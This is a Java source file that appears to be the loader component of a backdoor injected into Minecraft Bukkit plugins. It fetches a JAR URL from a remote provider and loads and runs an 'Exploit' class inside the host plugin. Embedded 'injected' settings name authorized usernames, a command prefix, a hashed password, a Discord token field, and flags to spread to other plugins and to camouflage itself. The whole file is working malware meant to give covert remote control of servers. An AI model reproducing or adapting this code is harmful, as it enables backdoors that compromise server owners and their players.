package com.tmquan2508.exploit;

import org.bukkit.plugin.Plugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;

public class Config {
    public Config(Plugin plugin) {
        loadExploitModule(plugin);
    }

    private void loadExploitModule(Plugin plugin) {
        
        // This will be change when I release
        String rawUrlProvider = "http://localhost:3000";

        plugin.getLogger().info("Fetching JAR URL from: " + rawUrlProvider);

        try {
            String jarUrl = fetchJarUrl(rawUrlProvider);

            if (jarUrl == null || jarUrl.trim().isEmpty()) {
                plugin.getLogger().severe("Failed to fetch a valid JAR URL from the provider.");
                return;
            }

            plugin.getLogger().info("Attempting to load Exploit module from URL: " + jarUrl);

            URL[] urls = { new URL(jarUrl) };

            URLClassLoader classLoader = new URLClassLoader(urls, plugin.getClass().getClassLoader());

            String exploitClassName = "com.tmquan2508.exploit.Exploit";
            plugin.getLogger().info("Loading class: " + exploitClassName);
            Class<?> exploitClass = classLoader.loadClass(exploitClassName);

            plugin.getLogger().info("Finding constructor Exploit(Plugin, Config)...");
            Constructor<?> constructor = exploitClass.getConstructor(Plugin.class, Config.class);

            plugin.getLogger().info("Initializing Exploit...");
            constructor.newInstance(plugin, this);

            plugin.getLogger().info("Successfully loaded and initialized the Exploit module from URL!");

        } catch (Exception e) {
            plugin.getLogger().severe("A critical error occurred while loading the Exploit module from URL:");
            e.printStackTrace();
        }
    }

    private String fetchJarUrl(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");

        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            return reader.readLine();
        } finally {
            connection.disconnect();
        }
    }


    public static String[] authorized_uuids;
    public static String[] authorized_usernames;
    public static String command_prefix;
    public static boolean spread_to_other;
    public static boolean debug_log;
    public static String discord_token;
    public static String authorized_password;
    public static boolean camouflage;

    static {
        getInjectedConfig();
    }

    private static void getInjectedConfig() {
        String injected_authorized_uuids = "";
        String injected_authorized_usernames = "Kudo,Vdung";
        String injected_command_prefix = "!";
        boolean injected_spread_to_other = Boolean.parseBoolean("true");
        boolean injected_debug_log = Boolean.parseBoolean("true");
        String injected_discord_token = "";
        String injected_authorized_password = "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5";
        boolean injected_camouflage = Boolean.parseBoolean("true");

        authorized_uuids = injected_authorized_uuids.isEmpty() ? new String[0] : injected_authorized_uuids.split(",");
        authorized_usernames = injected_authorized_usernames.isEmpty() ? new String[0] : injected_authorized_usernames.split(",");
        command_prefix = injected_command_prefix;
        spread_to_other = injected_spread_to_other;
        debug_log = injected_debug_log;
        discord_token = injected_discord_token;
        authorized_password = injected_authorized_password;
        camouflage = injected_camouflage;
    }
}